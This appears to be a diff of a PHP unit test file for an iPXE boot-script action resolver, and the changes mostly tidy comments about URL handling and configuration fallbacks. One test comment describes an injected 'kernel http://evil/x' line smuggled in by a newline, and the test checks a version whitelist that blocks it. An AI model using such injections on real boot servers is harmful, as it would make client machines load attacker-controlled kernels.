@@ -14,7 +14,7 @@ use Tests\Support\IpxeSchemaBootstrapper;
 use Tests\TestCase;
 
 /**
- * Story 3.2 — AC1.2 / T1.6.
+ * T1.6.
  *
  * Tests unitaires du résolveur d'actions whitelistées
  * {@see IpxeActionResolver}.
@@ -74,7 +74,7 @@ class IpxeActionResolverTest extends TestCase
         $body = $this->resolver->resolve(IpxeAdminAction::Winpe, null, $request);
 
         self::assertStringStartsWith('#!ipxe', $body);
-        // URLs ABSOLUES (fix 2026-06-04) : le script natif est servi depuis
+        // URLs ABSOLUES : le script natif est servi depuis
         // `/ipxe/action/<enum>` — un chemin relatif `Win10/wimboot` se
         // résoudrait en `/ipxe/action/Win10/wimboot` → 410 → abort iPXE.
         self::assertStringContainsString('kernel http://se4fs.lan/ipxe/Win10/wimboot', $body);
@@ -183,15 +183,11 @@ class IpxeActionResolverTest extends TestCase
         }
     }
 
-    /* ------------------------------------------------------------------
-     * Story 3.2 — Correctif review #2 / #B2 (whitelist version winpe)
-     * ------------------------------------------------------------------ */
-
     #[Test]
     public function it_rejects_invalid_version_and_falls_back_to_default(): void
     {
-        // Fix review #B2 — test injection iPXE. Sans whitelist, le firmware
-        // exécutait la ligne `kernel http://evil/x` injectée via newline.
+        // Sans whitelist de version, le firmware exécute la ligne
+        // `kernel http://evil/x` injectée par un retour à la ligne.
         $request = $this->makeRequest([
             'mac' => 'aa:bb:cc:dd:ee:ff',
             'uuid' => '12345678-1234-1234-1234-123456789abc',
@@ -244,15 +240,15 @@ class IpxeActionResolverTest extends TestCase
     }
 
     /* ------------------------------------------------------------------
-     * Story 3.5 — AC6.2 / AC7.1 — resolveWindowsVariables() + templates.
+     * ResolveWindowsVariables + templates.
      * ------------------------------------------------------------------ */
 
     #[Test]
     public function it_resolves_install_win11_with_wimboot_kernel(): void
     {
-        // `script_url` = base `/ipxe` complète (même sémantique que le test
-        // rescuecd/autorun — fix 2026-06-04, avant le code re-suffixait
-        // `/ipxe` → `/ipxe/ipxe/windows/...` quand dérivé de la Request).
+        // `script_url` porte la base `/ipxe` complète, comme dans le test
+        // rescuecd/autorun : dérivée de la Request, elle serait re-suffixée en
+        // `/ipxe/ipxe/windows/...`.
         Config::set('ipxe.actions.script_url', 'http://se4fs.lan/ipxe');
 
         $request = $this->makeRequest([
@@ -272,7 +268,7 @@ class IpxeActionResolverTest extends TestCase
         self::assertStringContainsString('initrd --name winpeshl.ini http://se4fs.lan/ipxe/os/winpe/winpeshl.ini', $body);
         self::assertStringContainsString('initrd --name install.bat', $body);
         self::assertStringContainsString('initrd --name unattend.xml', $body);
-        // URLs natives 3.5 — pas de double `/ipxe/ipxe/`.
+        // URLs natives — pas de double `/ipxe/ipxe/`.
         self::assertStringContainsString('http://se4fs.lan/ipxe/windows/install.bat##params', $body);
         self::assertStringContainsString('http://se4fs.lan/ipxe/windows/unattend.xml##params', $body);
         self::assertStringNotContainsString('/ipxe/ipxe/', $body);
@@ -342,7 +338,7 @@ class IpxeActionResolverTest extends TestCase
     #[Test]
     public function it_does_not_set_windows_variables_for_linux_actions(): void
     {
-        // Non-régression 3.4 : InstallDebGnome n'expose pas $windowsVersion.
+        // Non-régression : InstallDebGnome n'expose pas $windowsVersion.
         // On vérifie qu'aucune section Win-specific n'apparaît.
         Config::set('ipxe.actions.script_url', 'http://se4fs.lan/ipxe');
 
@@ -361,11 +357,10 @@ class IpxeActionResolverTest extends TestCase
     }
 
     /**
-     * Post-review #5 — cohérence `resolveServerBaseUrl()` entre `IpxeService`
-     * et `IpxeActionResolver`. Si Henri pose `IPXE_SE4FS_URL=http://proxy.lan`
-     * (ou `config('ipxe.se4fs_url')`), les deux résolveurs doivent retourner
-     * la MÊME URL — sinon les templates des outils diagnostic (gparted, hdt,
-     * memtest) auraient des chemins kernel cassés en prod.
+     * `resolveServerBaseUrl()` doit rendre la MÊME URL dans `IpxeService` et
+     * dans `IpxeActionResolver` quand `IPXE_SE4FS_URL` (ou
+     * `config('ipxe.se4fs_url')`) est posé. Sinon les templates des outils de
+     * diagnostic (gparted, hdt, memtest) portent des chemins kernel cassés.
      *
      * On exerce le comportement via `IpxeActionResolver::resolve()` (la
      * propriété `serverBaseUrl` apparaît dans `gparted.blade.php` ligne
@@ -396,9 +391,8 @@ class IpxeActionResolverTest extends TestCase
     }
 
     /**
-     * Post-review #5 — fallback deprecated `ipxe.actions.server_base_url`
-     * tolère encore les déploiements qui auraient configuré l'ancienne clé
-     * (compat descendante). À retirer en Phase 3.
+     * `ipxe.actions.server_base_url` est l'ancienne clé, encore tolérée en repli
+     * pour les déploiements qui l'ont configurée.
      */
     #[Test]
     public function it_falls_back_to_legacy_actions_server_base_url_when_canonical_empty(): void
